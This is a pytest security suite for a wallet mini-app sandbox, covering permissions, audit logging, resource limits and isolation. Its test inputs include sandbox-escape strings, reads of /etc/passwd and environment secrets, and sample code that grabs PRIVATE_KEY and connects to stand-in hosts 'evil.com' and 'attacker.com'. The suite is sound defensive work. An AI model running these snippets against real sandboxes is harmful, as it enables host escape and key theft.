"""
Comprehensive Security Tests for Mini-App Sandbox

Tests security boundaries:
- Permission enforcement
- Resource limits
- Code injection prevention
- Filesystem isolation
- Network isolation
- Dangerous operation blocking
"""

import json
import os
import pytest
import tempfile
import time
from pathlib import Path
from unittest.mock import Mock, MagicMock

# Import sandbox components
from xai.sandbox.permissions import (
    Permission,
    PermissionLevel,
    PermissionManager,
    PermissionDeniedError,
    AuditLog,
    PermissionGrant,
)

from xai.sandbox.secure_executor import (
    SecureExecutor,
    ExecutionContext,
    ExecutionResult,
    ResourceLimits,
    ResourceLimitExceeded,
    SandboxAPI,
)


class TestPermissionSystem:
    """Test capability-based permission system"""

    def test_permission_request_denied_by_default(self):
        """Permissions should be denied by default"""
        manager = PermissionManager()

        assert not manager.has_permission(
            "test_app",
            Permission.READ_BALANCE,
            PermissionLevel.READ
        )

    def test_permission_grant_and_check(self):
        """Test granting and checking permissions"""
        manager = PermissionManager()

        # Request permission (not auto-approved)
        granted = manager.request_permission(
            "test_app",
            Permission.READ_BALANCE,
            PermissionLevel.READ
        )

        assert not granted
        assert not manager.has_permission("test_app", Permission.READ_BALANCE)

        # Approve permission
        manager.approve_permission(
            "test_app",
            Permission.READ_BALANCE,
            user_address="user123"
        )

        assert manager.has_permission("test_app", Permission.READ_BALANCE)

    def test_verified_app_auto_grant(self):
        """Verified apps can auto-grant safe permissions"""
        manager = PermissionManager()
        manager.verify_app("trusted_app")

        # Request safe permission
        granted = manager.request_permission(
            "trusted_app",
            Permission.READ_BALANCE,
            PermissionLevel.READ,
            auto_approve=True
        )

        assert granted
        assert manager.has_permission("trusted_app", Permission.READ_BALANCE)

    def test_dangerous_permission_never_auto_granted(self):
        """Dangerous permissions require manual approval even for verified apps"""
        manager = PermissionManager()
        manager.verify_app("trusted_app")

        # Try to auto-grant dangerous permission
        granted = manager.request_permission(
            "trusted_app",
            Permission.SIGN_TRANSACTIONS,
            PermissionLevel.WRITE,
            auto_approve=True
        )

        # Should not auto-grant
        assert not granted

    def test_permission_expiration(self):
        """Time-limited permissions should expire"""
        manager = PermissionManager()

        # Grant short-lived permission
        manager.request_permission(
            "test_app",
            Permission.READ_BALANCE,
            duration_seconds=1
        )

        manager.approve_permission(
            "test_app",
            Permission.READ_BALANCE,
            user_address="user123"
        )

        # Should be valid immediately
        assert manager.has_permission("test_app", Permission.READ_BALANCE)

        # Wait for expiration
        time.sleep(1.1)

        # Should be expired
        assert not manager.has_permission("test_app", Permission.READ_BALANCE)

    def test_permission_revocation(self):
        """Permissions can be revoked"""
        manager = PermissionManager()

        manager.request_permission("test_app", Permission.READ_BALANCE)
        manager.approve_permission("test_app", Permission.READ_BALANCE, "user123")

        assert manager.has_permission("test_app", Permission.READ_BALANCE)

        # Revoke
        manager.revoke_permission("test_app", Permission.READ_BALANCE)

        assert not manager.has_permission("test_app", Permission.READ_BALANCE)

    def test_permission_level_enforcement(self):
        """Permission levels should be enforced"""
        manager = PermissionManager()

        # Grant READ level
        manager.request_permission(
            "test_app",
            Permission.STORAGE_READ,
            PermissionLevel.READ
        )
        manager.approve_permission("test_app", Permission.STORAGE_READ, "user123")

        # READ should be granted
        assert manager.has_permission(
            "test_app",
            Permission.STORAGE_READ,
            PermissionLevel.READ
        )

        # WRITE should be denied (higher level)
        assert not manager.has_permission(
            "test_app",
            Permission.STORAGE_READ,
            PermissionLevel.WRITE
        )

    def test_check_permission_raises_on_denial(self):
        """check_permission should raise PermissionDeniedError"""
        manager = PermissionManager()

        with pytest.raises(PermissionDeniedError) as exc_info:
            manager.check_permission(
                "test_app",
                Permission.READ_BALANCE,
                PermissionLevel.READ
            )

        assert exc_info.value.app_id == "test_app"
        assert exc_info.value.permission == Permission.READ_BALANCE

    def test_audit_log_records_all_operations(self):
        """All permission operations should be logged"""
        audit_log = AuditLog()
        manager = PermissionManager(audit_log=audit_log)

        # Request permission
        manager.request_permission("test_app", Permission.READ_BALANCE)

        # Check audit log
        entries = audit_log.get_entries(app_id="test_app")
        assert len(entries) >= 1
        assert entries[0].permission == Permission.READ_BALANCE
        assert entries[0].action == "request"

    def test_audit_log_detects_suspicious_activity(self):
        """Audit log should detect high frequency of denials"""
        audit_log = AuditLog()
        manager = PermissionManager(audit_log=audit_log)

        # Generate many denials
        for i in range(15):
            try:
                manager.check_permission(
                    "malicious_app",
                    Permission.SIGN_TRANSACTIONS,
                    action=f"attempt_{i}"
                )
            except PermissionDeniedError:
                pass

        # Should detect suspicious activity
        suspicious = audit_log.get_suspicious_activity("malicious_app", threshold=10)
        assert len(suspicious) >= 10

    def test_permission_persistence(self):
        """Permissions should persist to disk"""
        with tempfile.TemporaryDirectory() as tmpdir:
            storage_path = Path(tmpdir) / "permissions.json"

            # Create manager and grant permission
            manager1 = PermissionManager(storage_path=storage_path)
            manager1.request_permission("test_app", Permission.READ_BALANCE)
            manager1.approve_permission("test_app", Permission.READ_BALANCE, "user123")

            # Create new manager (should load from disk)
            manager2 = PermissionManager(storage_path=storage_path)

            assert manager2.has_permission("test_app", Permission.READ_BALANCE)


class TestSecureExecutor:
    """Test secure code execution"""

    def test_simple_python_execution(self):
        """Test basic Python code execution"""
        executor = SecureExecutor(use_subprocess=False)

        code = """
result = 2 + 2
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        # May not have RestrictedPython installed
        if executor.has_restricted_python:
            assert result.success

    def test_dangerous_import_blocked(self):
        """Dangerous imports should be blocked"""
        executor = SecureExecutor(use_subprocess=False)

        # Try to import os (dangerous)
        code = """
import os
os.system('echo pwned')
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # Should fail or raise error
            assert not result.success or "import" in result.error.lower()

    def test_file_access_blocked(self):
        """File system access should be blocked"""
        executor = SecureExecutor(use_subprocess=False)

        code = """
open('/etc/passwd', 'r').read()
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # 'open' should not be available
            assert not result.success

    def test_network_access_blocked(self):
        """Network access should be blocked by default"""
        executor = SecureExecutor(use_subprocess=False)

        code = """
import socket
socket.socket().connect(('evil.com', 80))
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # socket import should fail
            assert not result.success

    def test_infinite_loop_timeout(self):
        """Infinite loops should timeout"""
        executor = SecureExecutor(
            limits=ResourceLimits(max_wall_time_seconds=2),
            use_subprocess=False
        )

        code = """
while True:
    pass
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # Should timeout
            assert not result.success
            assert result.resource_exceeded or "timeout" in result.error.lower()

    def test_memory_limit_enforced(self):
        """Memory limits should be enforced"""
        executor = SecureExecutor(
            limits=ResourceLimits(max_memory_mb=10),
            use_subprocess=True  # subprocess enforces better
        )

        # Try to allocate large array
        code = """
# Try to allocate 100MB
data = [0] * (100 * 1024 * 1024)
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code,
            entry_point="main"
        )

        result = executor.execute(context)

        # Should fail with memory limit
        # (Exact behavior depends on platform)

    def test_allowed_imports_work(self):
        """Whitelisted imports should be allowed"""
        executor = SecureExecutor(use_subprocess=False)

        code = """
import json
result = json.dumps({'test': 123})
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code,
            allowed_imports={"json"}
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            assert result.success

    def test_disallowed_allowed_imports_rejected(self):
        """Non-allowlisted imports should fail validation."""
        executor = SecureExecutor(use_subprocess=False)

        context = ExecutionContext(
            app_id="test_app",
            code="import os\n",
            allowed_imports={"os"},
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            assert not result.success
            assert "allowlisted" in result.error or "attachment" in result.error.lower()

    def test_subprocess_import_guard_blocks_os(self):
        """Subprocess execution should reject imports outside allowed list."""
        executor = SecureExecutor(use_subprocess=True)

        code = """
import os
"""
        context = ExecutionContext(
            app_id="test_app",
            code=code,
            allowed_imports={"json"},  # os should be blocked
        )

        result = executor.execute(context)
        assert result.success is False
        assert "not permitted" in result.error or "allowlisted" in result.error

    def test_entry_point_execution(self):
        """Entry point function should be called"""
        executor = SecureExecutor(use_subprocess=False)

        code = """
def main(x, y):
    return x + y
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code,
            entry_point="main",
            arguments={"x": 5, "y": 3}
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            assert result.success
            assert result.return_value == 8

    def test_output_size_limit(self):
        """Output should be limited in size"""
        executor = SecureExecutor(
            limits=ResourceLimits(max_output_bytes=100)
        )

        code = """
for i in range(10000):
    print('x' * 1000)
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # Output should be truncated
            assert len(result.output) <= 100

    def test_subprocess_isolation(self):
        """Subprocess execution should provide strong isolation"""
        executor = SecureExecutor(
            limits=ResourceLimits(max_cpu_seconds=2),
            use_subprocess=True
        )

        code = """
def main():
    return "Hello from subprocess"
"""

        context = ExecutionContext(
            app_id="test_app",
            code=code,
            entry_point="main"
        )

        result = executor.execute(context)

        # Should complete successfully
        assert result.success or "not implemented" in result.error.lower()


class TestSandboxAPI:
    """Test sandbox API wrapper"""

    def test_api_permission_check(self):
        """API calls should check permissions"""
        permission_manager = PermissionManager()
        wallet_interface = Mock()

        api = SandboxAPI(
            app_id="test_app",
            permission_manager=permission_manager,
            wallet_interface=wallet_interface
        )

        # Try to get balance without permission
        with pytest.raises(PermissionDeniedError):
            api.get_balance()

    def test_api_with_permission(self):
        """API calls should work with proper permission"""
        permission_manager = PermissionManager()
        wallet_interface = Mock()
        wallet_interface.get_balance.return_value = 100.0

        # Grant permission
        permission_manager.request_permission(
            "test_app",
            Permission.READ_BALANCE
        )
        permission_manager.approve_permission(
            "test_app",
            Permission.READ_BALANCE,
            "user123"
        )

        api = SandboxAPI(
            app_id="test_app",
            permission_manager=permission_manager,
            wallet_interface=wallet_interface
        )

        # Should work
        balance = api.get_balance()
        assert balance == 100.0
        wallet_interface.get_balance.assert_called_once()

    def test_transaction_requires_approval(self):
        """Transactions should require user approval"""
        permission_manager = PermissionManager()
        wallet_interface = Mock()

        # Grant transaction permission
        permission_manager.request_permission(
            "test_app",
            Permission.SIGN_TRANSACTIONS,
            PermissionLevel.WRITE
        )
        permission_manager.approve_permission(
            "test_app",
            Permission.SIGN_TRANSACTIONS,
            "user123"
        )

        api = SandboxAPI(
            app_id="test_app",
            permission_manager=permission_manager,
            wallet_interface=wallet_interface
        )

        # Create transaction
        tx = api.create_transaction(
            recipient="addr123",
            amount=10.0,
            memo="test"
        )

        # Should return pending transaction
        assert tx["status"] == "pending_approval"
        assert tx["recipient"] == "addr123"
        assert tx["amount"] == 10.0

    def test_transaction_limit_enforced(self):
        """Transaction read limits should be enforced"""
        permission_manager = PermissionManager()
        wallet_interface = Mock()
        wallet_interface.get_transactions.return_value = []

        # Grant permission
        permission_manager.request_permission(
            "test_app",
            Permission.READ_TRANSACTIONS
        )
        permission_manager.approve_permission(
            "test_app",
            Permission.READ_TRANSACTIONS,
            "user123"
        )

        api = SandboxAPI(
            app_id="test_app",
            permission_manager=permission_manager,
            wallet_interface=wallet_interface
        )

        # Request too many transactions
        api.get_transactions(limit=1000)

        # Should be capped at 100
        wallet_interface.get_transactions.assert_called_once_with(100)


class TestSecurityBoundaries:
    """Test security boundary enforcement"""

    def test_no_escape_to_host_system(self):
        """Code should not be able to escape sandbox"""
        executor = SecureExecutor(use_subprocess=False)

        # Try various escape techniques
        escape_attempts = [
            "import sys; sys.exit()",
            "__import__('os').system('ls')",
            "exec('import os')",
            "eval('__import__(\"os\")')",
            "globals()['__builtins__']['open']",
        ]

        for code in escape_attempts:
            context = ExecutionContext(
                app_id="malicious_app",
                code=code
            )

            result = executor.execute(context)

            if executor.has_restricted_python:
                # All should fail
                assert not result.success, f"Escape attempt succeeded: {code}"

    def test_no_privilege_escalation(self):
        """Code should not be able to escalate privileges"""
        permission_manager = PermissionManager()

        # Grant low privilege
        permission_manager.request_permission(
            "test_app",
            Permission.READ_BALANCE,
            PermissionLevel.READ
        )
        permission_manager.approve_permission(
            "test_app",
            Permission.READ_BALANCE,
            "user123"
        )

        # Try to escalate to write
        with pytest.raises(PermissionDeniedError):
            permission_manager.check_permission(
                "test_app",
                Permission.SEND_TRANSACTIONS,
                PermissionLevel.WRITE
            )

    def test_resource_exhaustion_prevented(self):
        """Resource exhaustion attacks should be prevented"""
        executor = SecureExecutor(
            limits=ResourceLimits(
                max_cpu_seconds=1,
                max_memory_mb=10,
                max_wall_time_seconds=2
            ),
            use_subprocess=False
        )

        # CPU exhaustion
        cpu_bomb = "x = 1\nwhile True: x *= 2"

        context = ExecutionContext(app_id="test_app", code=cpu_bomb)
        result = executor.execute(context)

        if executor.has_restricted_python:
            assert not result.success or result.resource_exceeded

    def test_information_disclosure_prevented(self):
        """Code should not be able to read sensitive information"""
        executor = SecureExecutor(use_subprocess=False)

        # Try to read environment variables
        code = """
import os
env = os.environ
"""

        context = ExecutionContext(app_id="test_app", code=code)
        result = executor.execute(context)

        if executor.has_restricted_python:
            # os module should not be available
            assert not result.success


class TestIntegration:
    """Integration tests for complete sandbox"""

    def test_full_app_lifecycle(self):
        """Test complete mini-app lifecycle"""
        # Setup
        permission_manager = PermissionManager()
        wallet_interface = Mock()
        wallet_interface.get_balance.return_value = 50.0

        # Install app (request permissions)
        app_id = "calculator_app"
        permission_manager.request_permission(
            app_id,
            Permission.READ_BALANCE
        )

        # User approves
        permission_manager.approve_permission(
            app_id,
            Permission.READ_BALANCE,
            user_address="user123"
        )

        # Create API
        api = SandboxAPI(
            app_id=app_id,
            permission_manager=permission_manager,
            wallet_interface=wallet_interface
        )

        # Execute app code
        executor = SecureExecutor()

        code = """
def calculate(a, b):
    return a + b
"""

        context = ExecutionContext(
            app_id=app_id,
            code=code,
            entry_point="calculate",
            arguments={"a": 10, "b": 20},
            api_functions={"get_balance": api.get_balance}
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            assert result.success
            assert result.return_value == 30

    def test_malicious_app_blocked(self):
        """Malicious app should be blocked at multiple layers"""
        permission_manager = PermissionManager()
        executor = SecureExecutor()

        # Malicious code trying multiple attacks
        malicious_code = """
# Try to steal private keys
import os
os.environ.get('PRIVATE_KEY')

# Try to make network request
import socket
socket.socket().connect(('attacker.com', 80))

# Try to write file
with open('/tmp/stolen_data', 'w') as f:
    f.write('hacked')
"""

        context = ExecutionContext(
            app_id="malicious_app",
            code=malicious_code
        )

        result = executor.execute(context)

        if executor.has_restricted_python:
            # Should fail due to import restrictions
            assert not result.success

        # Even if code ran, permissions would block sensitive operations
        with pytest.raises(PermissionDeniedError):
            permission_manager.check_permission(
                "malicious_app",
                Permission.PRIVATE_KEY_EXPORT
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
